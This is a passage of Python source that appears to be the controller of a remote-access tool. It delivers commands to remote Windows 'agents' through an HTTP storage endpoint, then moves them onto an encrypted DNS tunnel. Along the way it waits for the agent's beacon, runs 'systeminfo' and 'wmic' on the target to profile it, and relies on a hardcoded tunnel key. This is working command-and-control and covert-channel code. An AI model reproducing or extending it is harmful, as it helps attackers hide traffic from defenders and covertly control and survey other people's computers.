                        updated               = self.controller.selected_agent_data.copy()
                        updated['dns_ready']  = True
                        updated['dns_domain'] = self.dns_credentials.get('domain', 'tunnel.local')
                        updated['dns_port']   = self.dns_credentials.get('port', '53')
                        updated['saved']      = True
                        self.controller.save_agent(updated)
                        self.controller.selected_agent_data = updated
                        self.controller._log_m(
                            "SYS: Agent upgraded to Mode 2 (DNS confirmed)"
                        )

                    self.controller.root.after(0, self.controller.upmdui)

                    if self.dns_server.send_command(
                        self.current_agent_id,
                        "systeminfo && wmic path win32_VideoController get name",
                    ):
                        t = threading.Thread(target=self.s_audit_, daemon=True)
                        t.start()
                        self.response_threads.append(t)

                    self.controller.mode_switching = False
                    self.controller._log_m(
                        "SYS: Connection established — waiting for full system audit..."
                    )
                    return

            elapsed   = int(time.time() - start_time)
            remaining = timeout - elapsed
            if elapsed > 0 and elapsed % 15 == 0:
                self.controller._log_m(
                    f"SYS: Still waiting for {expected_device_name}... "
                    f"({elapsed}s elapsed, {remaining}s remaining)"
                )
            time.sleep(1)

        self.controller._log_m(
            f"SYS: {expected_device_name} did not connect within {timeout}s"
        )
        self.controller._log_m(
            "SYS: Agent remains in Mode 1 (HTTP) — DNS handshake not confirmed"
        )
        self.controller.mode_switching = False

    def _send_dns_config_via_http(self, agent_data):
        try:
            dns_config_cmd = (
                f"cmd--dns-mode "
                f"{json.dumps(self.dns_credentials, separators=(',', ':'))}"
            )
            response = self.controller.session.put(
                agent_data.get('url'),
                json={
                    "cmd":           dns_config_cmd,
                    "cmd_result":    "TUNNEL Mode configuration sent",
                    "device_status": "switching_to_dns",
                },
                headers={
                    "X-Master-Key": agent_data.get('api_key'),
                    "Content-Type": "application/json",
                },
                timeout=5,
            )
            if response.status_code == 200:
                self.controller._log_m("SYS: DNS config sent to agent via HTTP")
                return True
            else:
                self.controller._log_m(
                    f"ERROR: Config send failed ({response.status_code})"
                )
                return False
        except Exception as e:
            self.controller._log_m(f"ERROR sending DNS config: {e}")
            return False

    def s_audit_(self):
        max_wait   = 60
        start_time = time.time()

        while time.time() - start_time < max_wait:
            with self.lock:
                srv = self.dns_server
            if not srv or not srv.running:
                return
            response = srv.agent_r(self.current_agent_id)
            if response:
                self.controller.p_audit(response)
                ui_data = self.controller.ui_prep()
                if ui_data:
                    self.controller.update_queue.put(("system_info_silent", ui_data))
                return
            time.sleep(2)


    def disconnect_current_agent(self):
        with self.lock:
            if self.current_agent_id:
                self.controller._log_m(
                    f"SYS: Disconnecting from {self.current_agent_id}..."
                )
                if self.dns_server:
                    try:
                        self.dns_server.send_command(
                            self.current_agent_id, "-mode jsonbin"
                        )
                        time.sleep(2)
                    except Exception:
                        pass
                self.current_agent_id = None

            self.srvr_stp()
            self.controller._log_m("SYS: Disconnected from agent")
            self.controller.root.after(0, self.controller.upmdui)

    def cm_dns(self, agent_data=None, config_already_sent=False):

        try:
            if agent_data:
                self.controller._log_m(
                    f"SYS: CONNECTING TO AGENT: {agent_data.get('device_name')}"
                )
                self.controller._log_m(
                    f"SYS: IP: {agent_data.get('device_ip')}"
                )

                if config_already_sent and self.dns_credentials:

                    self.controller._log_m(
                        f"SYS: Using pre-resolved DNS config — "
                        f"server_ip={self.dns_credentials.get('server_ip')}  "
                        f"port={self.dns_credentials.get('port')}"
                    )

                    self.controller._log_m("SYS: Starting DNS server...")
                    if not self.srvr_strt():
                        self.controller._log_m("ERROR: Failed to start DNS server")
                        self.controller.mode_switching = False
                        return

                    time.sleep(1)
                    if not self.v_server():
                        self.controller._log_m("ERROR: DNS server not responding")
                        self.srvr_stp()
                        self.controller.mode_switching = False
                        return

                    self.controller._log_m(
                        "SYS: DNS server ready — waiting for agent beacon..."
                    )

                    t = threading.Thread(
                        target=self.w_specific_agent,
                        args=(agent_data.get('device_name'),),
                        daemon=True,
                    )
                    t.start()
                    self.response_threads.append(t)
                    return

                def _is_private(ip):
                    if not ip:
                        return True
                    return (
                        ip.startswith("10.")       or
                        ip.startswith("192.168.")  or
                        ip.startswith("172.16.")   or
                        ip.startswith("172.17.")   or
                        ip.startswith("172.18.")   or
                        ip.startswith("172.19.")   or
                        ip.startswith("172.2")     or
                        ip.startswith("172.3")     or
                        ip.startswith("127.")
                    )

                agent_ip  = agent_data.get('device_ip', '')
                local_ip  = self._get_local_ip()
                public_ip = self._ip_loc()

                if agent_ip == local_ip or agent_ip in ('127.0.0.1', 'localhost'):
                    server_ip = '127.0.0.1'
                    self.controller._log_m("SYS: Same-host agent — using 127.0.0.1")
                elif public_ip and agent_ip == public_ip:
                    server_ip = local_ip
                    self.controller._log_m(
                        f"SYS: Same-NAT agent (shared public IP {public_ip}) "
                        f"— using LAN IP: {server_ip}"
                    )
                elif _is_private(agent_ip):
                    server_ip = local_ip
                    self.controller._log_m(
                        f"SYS: LAN agent — using local IP: {server_ip}"
                    )
                elif public_ip and not _is_private(public_ip):
                    server_ip = public_ip
                    self.controller._log_m(
                        f"SYS: Cross-network agent — using public IP: {server_ip}"
                    )
                else:
                    server_ip = local_ip or "127.0.0.1"
                    self.controller._log_m(
                        f"SYS: IP fallback — using: {server_ip}"
                    )

                if agent_data.get('dns_ready'):
                    self.dns_credentials = {
                        'encryption_key': agent_data.get(
                            'dns_encryption_key', 'my_secret_dns_key_12345'),
                        'domain':  agent_data.get('dns_domain', 'tunnel.local'),
                        'port':    str(agent_data.get('dns_port', '53')),
                        'server_ip': server_ip,
                    }
                else:
                    self.dns_credentials = {
                        'encryption_key': 'my_secret_dns_key_12345',
                        'domain':         'tunnel.local',
                        'port':           '53',
                        'server_ip':      server_ip,
                    }

                self.controller._log_m("SYS: Starting DNS server...")
                if not self.srvr_strt():
                    self.controller._log_m("ERROR: Failed to start DNS server")
                    self.controller.mode_switching = False
                    return

                time.sleep(1)
                if not self.v_server():
                    self.controller._log_m("ERROR: DNS server not responding")
                    self.srvr_stp()
                    self.controller.mode_switching = False
                    return

                self.controller._log_m("SYS:  DNS server confirmed ready")

                if not agent_data.get('dns_ready'):
                    self.controller._log_m(
                        "SYS: Agent in HTTP Mode — sending DNS config via HTTP..."
                    )
                    if not self._send_dns_config_via_http(agent_data):
                        self.controller._log_m(
                            "SYS: HTTP config send failed. Agent may not switch."
                        )
                        self.srvr_stp()
                        self.controller.mode_switching = False
                        return
                else:
                    self.controller._log_m(
                        "SYS: Agent already in TUNNEL Mode — skipping HTTP trigger..."
                    )

                self.controller.active_mode = "dns"
                save_c_mode("dns")
                self.controller.root.after(0, self.controller.upmdui)

                t = threading.Thread(
                    target=self.w_specific_agent,
                    args=(agent_data.get('device_name'),),
                    daemon=True,
                )
                t.start()
                self.response_threads.append(t)

            else:

                self.dns_actv()
                self.controller.active_mode = "dns"
                save_c_mode("dns")
                self.controller.root.after(0, self.controller.upmdui)
                self.controller.mode_switching = False

        except Exception as e:
            self.controller._log_m(f"ERROR during DNS connection: {e}")
            import traceback
            self.controller._log_m(traceback.format_exc())
            self.controller.mode_switching = False